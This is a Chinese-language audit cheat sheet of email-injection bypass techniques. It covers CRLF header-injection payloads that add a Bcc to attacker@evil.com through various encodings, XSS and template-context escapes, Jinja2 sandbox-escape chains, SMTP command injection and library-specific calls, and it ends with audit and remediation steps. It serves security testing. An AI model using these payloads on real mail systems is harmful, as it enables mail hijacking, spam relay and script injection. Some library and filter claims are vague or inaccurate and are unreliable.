# 邮件注入绕过技巧

本文档汇总常见的邮件注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. CRLF 注入绕过技巧

### 1.1 换行符编码绕过

**防护机制**：简单的 `\r\n` 过滤

```php
// 防护代码
$to = str_replace(["\r", "\n"], "", $user_input);
$subject = str_replace(["\r", "\n"], "", $user_subject);
```

**绕过技巧**：

#### 方式 1：多字节编码
```
原始：test\r\nBcc: attacker@evil.com
绕过：test%0d%0aBcc: attacker@evil.com  (URL编码)
绕过：test\u000d\u000aBcc: attacker@evil.com  (Unicode)
绕过：test&#13;&#10;Bcc: attacker@evil.com  (HTML实体)
```

#### 方式 2：替换后再注入
```python
# PHP 防护只过滤 \r\n，但使用了 str_replace
# 在某些情况下，替换顺序会导致漏洞

# 原始代码
$input = str_replace("\r\n", " ", $_POST['email']);

# 攻击 1：使用 \r\r\n
test\r\r\nBcc: attacker@evil.com  # 替换后变成 test\r Bcc...

# 攻击 2：嵌套替换
test\r\r\nBcc: ...  # 多次替换中保留一个 \r 或 \n
```

#### 方式 3：特定框架的过滤绕过
```python
# Python Django 在某些版本可能只过滤 \n
# 绕过：使用 \r 单独注入
To: user@example.com\rBcc: attacker@evil.com

# PHP mail() 函数在某些情况下的处理
# 绕过：使用特定邮件库的特性
```

#### 方式 4：编码转换
```
原始过滤：remove all \r\n
绕过：在过滤前进行编码
- Base64 编码传入，内部解码后仍保留 CRLF
- 压缩后传入（gzip），解压后包含 CRLF
- 数据库存储时的转义和反转义
```

### 1.2 多层过滤绕过

**防护机制**：多步骤验证和过滤

```php
// 防护代码示例
function sanitize_email($email) {
    $email = trim($email);
    $email = str_replace(["\r", "\n"], "", $email);
    return $email;
}
```

**绕过技巧**：

#### 方式 1：Trim 前注入
```
原始输入：test\r\nBcc: attacker@evil.com
Trim 后：仍然包含 \r\n（trim 只处理开头结尾）
```

#### 方式 2：条件分支绕过
```php
// 仅在某些代码路径中过滤
if ($type == 'normal') {
    $email = sanitize($email);
} else if ($type == 'admin') {
    // 缺少过滤
    send_mail($email);
}
```

#### 方式 3：多次过滤的替换顺序问题
```python
# 危险的替换顺序
email = email.replace("\r\n", "\n")  # 第一步
email = email.replace("\n", "")      # 第二步
# 但如果中间有其他操作可能恢复 \r\n

# 更好的方式应该是一次性过滤所有变体
```

---

## 2. 邮件地址验证绕过

### 2.1 正则表达式绕过

**防护机制**：简单的邮箱验证正则

```php
// 防护代码
if (preg_match('/^[a-zA-Z0-9@.]+$/', $email)) {
    send_mail($email);
}
```

**绕过技巧**：

#### 方式 1：特殊字符绕过
```
输入：user@example.com\r\nBcc: attacker@evil.com
分析：正则只检查字符集，未检查结构
绕过：添加 \r\n，正则仍可匹配（因为 \r\n 本身不会导致正则失败）
```

#### 方式 2：多个 @ 符号
```
输入：user@attacker.com@example.com
分析：简单正则允许多个 @
绕过：取决于邮件库如何处理多个 @（通常只使用第一个）
```

#### 方式 3：连续点号
```
输入：user..name@example.com
分析：RFC 5322 不允许，但简单正则无法检测
绕过：某些邮件系统允许此格式，可用于绕过白名单
```

#### 方式 4：引号和特殊符号
```
RFC 5322 允许的格式：
- "user name"@example.com
- user+tag@example.com
- user.name@example.com

绕过：
- user%2Badmin@example.com  (URL编码 +)
- "user<script>"@example.com  (HTML 注入)
```

#### 方式 5：国际化域名（IDN）
```
输入：user@eхample.com  (西里尔字母 х 看似 x)
分析：正则无法检测 IDN homograph
绕过：类似于合法域名，但实际是欺骗域名
```

### 2.2 验证函数相关绕过

**防护机制**：使用标准库验证

```php
// PHP filter_var 在某些版本的漏洞
$email = "user@example.com\r\n";
var_dump(filter_var($email, FILTER_VALIDATE_EMAIL));
// 某些 PHP 版本可能返回 false，但在某些情况下可通过

// Java 验证
if (EmailValidator.getInstance().isValid(email)) {
    send_mail(email);
}
```

**绕过技巧**：

#### 方式 1：邮件库特性利用
```java
// 某些邮件库在验证通过后，会自动处理特殊字符
// 验证：user@example.com\r\nBcc: attacker  → 通过
// 发送时：自动从 \r\n 之前的部分提取邮箱

// 绕过：利用邮件库的实现细节
```

#### 方式 2：Unicode 规范化
```
输入：user@example.com  (使用 NFD 规范化的特殊 Unicode)
验证：通过（看似正常邮箱）
发送：解析为注入命令（Unicode 规范化后包含控制字符）
```

#### 方式 3：本地部分特殊格式
```
RFC 5322 允许：
user+tag@example.com
user.name@example.com
"user name"@example.com

绕过验证的同时注入：
user+admin%0d%0aBcc:attacker@example.com
```

---

## 3. 邮件模板注入绕过

### 3.1 模板引擎转义绕过

**防护机制**：自动转义用户输入

```jinja2
{# Django/Jinja2 转义 #}
{{ user_name|escape }}
{{ user_email|safe }}  # 不转义
```

**绕过技巧**：

#### 方式 1：绕过 autoescape
```jinja2
{# 虽然启用了 autoescape，但某些过滤器不转义 #}

{# 原始被转义的代码 #}
{{ user_input }}  {# 被转义 #}

{# 绕过：使用 safe 或不转义的过滤器 #}
{{ user_input|safe }}
{{ user_input|mark_safe }}
{{ user_input|striptags }}  {# 删除标签但不转义属性 #}
```

#### 方式 2：标签注入
```html
{# 防护：转义 <, >, & 等 #}
<!-- 原始被转义 -->
<p>{{ user_comment }}</p>

{# 绕过：使用 HTML 属性注入 #}
<input value="{{ user_input }}">
<!-- 输入：" onload="alert(1) #}
<!-- 生成：<input value="" onload="alert(1) #}

{# 或使用 style 属性 #}
<!-- 输入：" style="background: url('javascript:alert(1) #}
```

#### 方式 3：上下文逃逸
```javascript
// JavaScript 模板中的转义绕过
var email = "{{ user_email }}";

// 绕过：在 JS 字符串中注入
输入：test"; alert('xss'); var x="
生成：var email = "test"; alert('xss'); var x="";
```

#### 方式 4：多层模板引擎
```
如果模板被多次渲染：
1. 第一次渲染：{{ user_input }} → 输出原文
2. 第二次渲染：使用第一次的输出作为模板 → 执行代码

绕过：{{ user_input | safe }} 在第一次渲染中保留模板语法
```

### 3.2 沙箱逃逸

**防护机制**：使用沙箱模板环境

```python
# Jinja2 沙箱
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("{{ user_input }}")
```

**绕过技巧**：

#### 方式 1：对象属性链
```jinja2
{# 沙箱禁用 __class__, __bases__ 等 #}

{# 绕过：使用对象属性方法 #}
{{ user_obj.__dict__ }}
{{ user_obj.items() }}
{{ user_obj.values() }}

{# 更深层的属性链 #}
{{ config.items() }}
{{ request.args }}
{{ self }}
```

#### 方式 2：Jinja2 特殊变量
```jinja2
{# 利用 Jinja2 内置对象 #}
{{ self }}
{{ self.__dict__ }}
{{ lipsum }}
{{ joiner }}

{# 获取上下文 #}
{% for x in [1].__class__.__bases__[0].__subclasses__() %}
  ...
{% endfor %}
```

#### 方式 3：Python 内置函数突破
```jinja2
{# 在沙箱中，某些内置函数仍可用 #}
{{ user_input.__class__.__mro__ }}
{{ user_input|list }}
{{ user_input|dict }}

{# 利用 map 和 select 过滤器 #}
{{ range(10)|map('__class__')|list }}
```

---

## 4. SMTP 命令注入绕过

### 4.1 SMTP 协议特性利用

**防护机制**：检查特殊 SMTP 字符

```python
# 防护代码
if '\r' in email or '\n' in email:
    raise ValueError("Invalid email")

# 但使用了不安全的 SMTP 库
smtp.sendmail(from_email, to_email, message)
```

**绕过技巧**：

#### 方式 1：SMTP 协议的额外命令
```
标准 SMTP 命令：
MAIL FROM:<user@example.com>
RCPT TO:<victim@example.com>
DATA

绕过：注入额外命令
MAIL FROM:<user@example.com>
VRFY attacker@evil.com  {* 额外命令 *}
RCPT TO:<victim@example.com>
```

#### 方式 2：邮件格式的 CRLF 注入
```
邮件头和正文分隔：\r\n\r\n

绕过在邮件正文中注入：
From: user@example.com
To: victim@example.com
Subject: Test
\r\nBcc: attacker@evil.com

或者在正文中：
This is the body
\r\nBcc: attacker@evil.com\r\n
---
```

### 4.2 邮件库特性绕过

**防护机制**：使用邮件库的安全函数

```python
# Python smtplib
msg = EmailMessage()
msg['To'] = user_input  # 某些版本的库可能不过滤
```

**绕过技巧**：

#### 方式 1：邮件库版本差异
```python
# 不同版本的 smtplib 处理方式不同
# 某些版本允许在头中包含 CRLF，某些版本自动过滤

# 绕过：使用特定版本的漏洞
# 或使用特定方法的漏洞
msg.add_header('To', user_input)  # vs msg['To'] = user_input
```

#### 方式 2：Nodemailer 特性
```javascript
// Nodemailer 某些版本的漏洞
// 使用特定字段的格式绕过
transport.sendMail({
    from: user_from,  // "test\r\nBcc: attacker@evil.com"
    to: user_to,
    subject: user_subject
});

// 某些版本在处理 from 时不过滤 CRLF
```

---

## 5. 邮件头注入的编码绕过

### 5.1 字符编码和转换

**防护机制**：验证邮件头内容

**绕过技巧**：

#### 方式 1：RFC 2047 编码
```
RFC 2047 允许在邮件头中使用编码的文本：
=?charset?encoding?encoded-text?=

绕过：
Subject: =?UTF-8?B?dGVzdA==?=\r\nBcc: attacker@evil.com
验证：可能只检查非编码部分，忽略编码部分中的 CRLF
```

#### 方式 2：Quoted-Printable 编码
```
=3D 表示 =
=0D 表示 \r
=0A 表示 \n

绕过：
Subject: test=0D=0ABcc: attacker@evil.com
如果邮件客户端自动解码，会产生 CRLF 注入
```

#### 方式 3：MIME 边界注入
```
MIME 邮件结构：
--boundary
Content-Type: text/plain

message

--boundary--

绕过：在用户输入中注入 MIME 边界，分割邮件部分
```

---

## 6. 邮件地址格式化绕过

### 6.1 邮箱地址的特殊格式

**防护机制**：RFC 5322 验证

**绕过技巧**：

#### 方式 1：带注释的邮箱
```
RFC 5322 允许的格式：
user(comment)@example.com
(comment)user@example.com
user@example.com(comment)

绕过：
user(admin)@example.com  → 验证可能通过，但注释中可能包含敏感信息
user(%0d%0a)@example.com  → 注释中的编码 CRLF
```

#### 方式 2：IPv6 地址
```
RFC 5321 允许的 IPv6 地址：
user@[IPv6:2001:db8::1]

绕过：
验证可能不支持 IPv6 格式，导致验证绕过
某些邮件库无法正确处理 IPv6，导致注入
```

#### 方式 3：角括号格式
```
标准格式：
user@example.com
<user@example.com>
User Name <user@example.com>

绕过：
用户可能能注入角括号和额外地址：
User Name <user@example.com>, attacker@evil.com>
```

---

## 7. 多邮件库特定漏洞

### 7.1 PHPMailer 绕过

**已知绕过**：
```php
// PHPMailer 某些版本允许通过特定方法注入
$mail->addAddress("user@example.com\r\nBcc: attacker@evil.com");

// 或通过 addCustomHeader
$mail->addCustomHeader("To", "user@example.com\r\nBcc: attacker");
```

### 7.2 SwiftMailer 绕过

```php
// SwiftMailer 在某些版本中的漏洞
$message = Swift_Message::newInstance()
    ->setTo("user@example.com\r\nBcc: attacker");
```

### 7.3 Django Mail 绕过

```python
# Django 在某些版本的处理方式
from django.core.mail import send_mail

send_mail(
    subject="test",
    message="content",
    from_email="test@example.com\r\nBcc: attacker",
    recipient_list=["user@example.com"]
)
```

---

## 8. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 简单 CRLF 过滤 | 低 | 编码、多字节、替换顺序 |
| 简单正则验证 | 低 | 特殊字符、多个@符号、编码 |
| 标准库验证 | 中 | 版本差异、库特性、Unicode |
| 模板转义 | 中 | safe 过滤器、属性链、上下文逃逸 |
| 沙箱隔离 | 中-高 | 对象属性、内置函数、特殊变量 |
| 邮件库内置保护 | 高 | 版本漏洞、特定方法绕过 |

---

## 9. 审计建议

### 高风险指标
- 直接拼接用户输入到邮件头
- 验证基于简单正则或字符检查
- 模板转义不完整或使用 safe 过滤器
- 使用旧版本的邮件库
- 未进行 CRLF 过滤或过滤不完整

### 审计步骤
1. **定位邮件发送代码**：搜索邮件库导入和发送函数
2. **追踪输入来源**：确认用户输入如何到达邮件头/正文
3. **验证防护机制**：评估当前的验证和过滤方案
4. **尝试绕过**：使用本文档中的技巧验证防护的鲁棒性
5. **检查库版本**：确认使用的邮件库版本和已知漏洞
6. **生成报告**：记录所有发现的漏洞

### 验证修复
修复邮件注入漏洞时，确保：
- 对所有邮箱地址使用标准库验证函数
- 完整过滤或拒绝包含 CRLF 和其他特殊字符的输入
- 所有邮件模板输入启用自动转义
- 邮件库保持最新版本
- 邮件功能实施速率限制防止滥用
